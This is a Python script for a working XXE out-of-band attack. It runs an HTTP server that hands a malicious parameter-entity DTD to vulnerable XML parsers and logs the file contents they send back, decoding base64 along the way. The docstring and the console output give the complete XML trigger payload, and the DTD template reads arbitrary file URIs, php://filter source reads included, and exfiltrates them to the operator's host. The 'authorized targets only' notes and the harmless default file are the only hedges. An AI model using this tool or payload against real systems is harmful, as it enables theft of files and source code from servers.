#!/usr/bin/env python3
"""
oob_server.py — authorized XXE out-of-band DTD + exfil catcher.

Serves a parameter-entity `evil.dtd` that makes a vulnerable parser read a file and send it back to THIS server in a
URL, and logs the exfiltrated data (auto-decoding php://filter base64). Also logs any blind callback (proves blind XXE
even with no data). Run it on a host the target can reach (a VPS, or expose localhost via a tunnel); point --host at
that public address.

Discipline: read a BENIGN file first (default /etc/hostname); tear this listener down after; don't leave a public exfil
endpoint running. Authorized targets only.

Usage:
  python3 oob_server.py --host YOUR-PUBLIC-HOST:8000 --port 8000 --file file:///etc/hostname
  # then submit to the target:
  #   <?xml version="1.0"?>
  #   <!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://YOUR-PUBLIC-HOST:8000/evil.dtd"> %ext; ]>
  #   <r>trigger</r>
"""
import argparse, base64, sys
import urllib.parse as up
from http.server import BaseHTTPRequestHandler, HTTPServer

DTD_TEMPLATE = ('<!ENTITY % file SYSTEM "{fileuri}">\n'
                '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{host}/log?x=%file;\'>">\n'
                '%eval;\n%exfil;\n')


def _maybe_b64(s):
    """Return decoded text if s looks like base64 of printable data (php://filter case), else None."""
    if not s or len(s) < 8:
        return None
    try:
        dec = base64.b64decode(s + "===")           # pad generously
        txt = dec.decode("utf-8", "strict")
        printable = sum(c.isprintable() or c in "\r\n\t" for c in txt)
        return txt if printable >= 0.9 * len(txt) else None
    except Exception:
        return None


class Handler(BaseHTTPRequestHandler):
    host = ""
    fileuri = "file:///etc/hostname"

    def log_message(self, *a):
        pass  # suppress default noise; we print our own

    def _ok(self, body=b"ok", ctype="text/plain"):
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        src = self.client_address[0]
        if self.path.startswith("/evil.dtd"):
            body = DTD_TEMPLATE.format(host=self.host, fileuri=self.fileuri).encode()
            print(f"[dtd]   {src} fetched evil.dtd  (reading {self.fileuri})")
            return self._ok(body, "application/xml-dtd")
        if self.path.startswith("/log"):
            raw = up.parse_qs(up.urlparse(self.path).query).get("x", [""])[0]
            print(f"\n[EXFIL] {src}  x={raw!r}")
            dec = _maybe_b64(raw)
            if dec is not None:
                print("[EXFIL b64-decoded]\n" + "-" * 40 + f"\n{dec}\n" + "-" * 40)
            return self._ok()
        # any other path = a blind OOB callback (confirms XXE even with no file data)
        print(f"[hit]   {src} {self.path}   (blind callback — XXE confirmed)")
        return self._ok()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True, help="PUBLIC host:port the target will call back (goes into evil.dtd)")
    ap.add_argument("--port", type=int, default=8000, help="local bind port (default 8000)")
    ap.add_argument("--bind", default="0.0.0.0", help="local bind address (default 0.0.0.0)")
    ap.add_argument("--file", default="file:///etc/hostname",
                    help="file URI to read on the target (benign default). Use php://filter/... for source/multi-line.")
    a = ap.parse_args()
    Handler.host = a.host
    Handler.fileuri = a.file

    print(f"[*] serving evil.dtd + exfil catcher on {a.bind}:{a.port}")
    print(f"[*] target payload:\n"
          f'    <?xml version="1.0"?>\n'
          f'    <!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://{a.host}/evil.dtd"> %ext; ]>\n'
          f'    <r>trigger</r>\n')
    print("[*] reading:", a.file, "| Ctrl-C to stop (tear down after — don't leave it public).")
    try:
        HTTPServer((a.bind, a.port), Handler).serve_forever()
    except KeyboardInterrupt:
        print("\n[*] stopped.")
        sys.exit(0)


if __name__ == "__main__":
    main()
